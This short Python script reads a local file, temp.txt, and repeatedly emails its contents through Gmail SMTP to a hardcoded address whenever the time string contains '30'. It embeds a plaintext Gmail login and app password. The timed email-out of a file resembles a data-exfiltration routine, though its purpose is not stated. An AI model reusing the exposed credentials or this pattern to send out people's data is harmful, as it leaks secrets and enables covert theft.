import smtplib
from _time import human_time
import time
def backup_data():
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login("kccc187minecraft@gmail.com", "funukcflfrunarrk")
    text= []
    with open("temp.txt", "r") as t:
        for line in t:
            line = line.replace("\n", " | ")
            text.append(f"{line}")
    msg =f"""
    Subject: List
    {text}"""
    server.sendmail("kccc187minecraft@gmail.com", "kccc187minecraft@gmail.com", msg)


while True:
    if "30" in human_time():
        print("Sending Data!")
        backup_data()
        time.sleep(60)
        continue
